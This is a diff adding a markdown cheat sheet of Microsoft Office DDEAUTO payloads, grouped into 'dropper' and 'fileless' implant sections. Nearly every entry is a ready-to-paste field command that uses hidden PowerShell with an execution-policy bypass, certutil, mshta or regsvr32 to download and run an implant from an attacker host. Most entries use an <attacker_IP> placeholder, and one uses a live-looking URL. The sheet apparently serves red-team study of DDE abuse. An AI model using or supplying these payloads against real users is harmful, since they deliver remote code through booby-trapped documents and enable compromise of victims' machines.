@@ -1,0 +1,56 @@
+# Execution Methods
+
+## 01 - Dropper Implant
+
+### 1.1 - EXEcutable
+
+```
+DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/implant.exe', 'implant.exe'); Start-Process -FilePath implant.exe -NoNewWindow [-WorkingDirectory C:\path\to\directory] "
+
+DDEAUTO c:\\windows\\system32\\cmd.exe "/k certutil -urlcache -split -f http[s]://<attacker_IP>/implant.exe && implant.exe "
+```
+
+### 1.2 - JScript
+
+```
+DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/implant.js', 'implant.js'); Start-Process -FilePath cscript.exe -NoNewWindow -ArgumentList ("implant.js") [-WorkingDirectory C:\path\to\directory] "
+
+DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/implant.js', 'implant.js'); & start C:\\Windows\\System32\\cmd.exe /c cscript.exe implant.js "
+
+DDEAUTO c:\\windows\\system32\\cmd.exe "/k CertUtil.exe -urlcache -split -f http://willgenovese.com/hax/test.exe && test.exe "
+```
+
+### 1.3 - VBScript
+
+```
+DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/implant.vbs', 'implant.vbs'); Start-Process -FilePath cscript.exe -NoNewWindow -ArgumentList ("implant.vbs") [-WorkingDirectory C:\path\to\directory] "
+
+DDEAUTO C:\\Windows\\System32\\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass -Command (New-Object System.Net.WebClient).DownloadFile('http[s]://<attacker_IP>/implant.vbs', 'implant.vbs'); & start C:\\Windows\\System32\\cmd.exe /c cscript.exe implant.vbs "
+```
+
+## 02 - Fileless Implant
+
+### 2.1 - PowerShell
+
+```
+DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $implant=(New-Object System.Net.WebClient).DownloadString('http[s]://<attacker_IP>/implant.ps1');powershell -e $implant # " "for security reasons"
+```
+
+### 2.2 - HTA
+
+```
+DDEAUTO C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\mshta.exe http[s]://<IP>/implant.hta
+```
+
+### 2.3 - Scriptlet
+
+```
+DDEAUTO c:\\windows\\system32\\cmd.exe "/k regsvr32.exe /s /n /u /i:http[s]://<attacker_IP>/implant.sct scrobj.dll" 
+```
+
+---
+## References
+
+### Will Genovese
+
+- [Will Genovese: Office DDEAUTO attacks](https://willgenovese.com/office-ddeauto-attacks/)
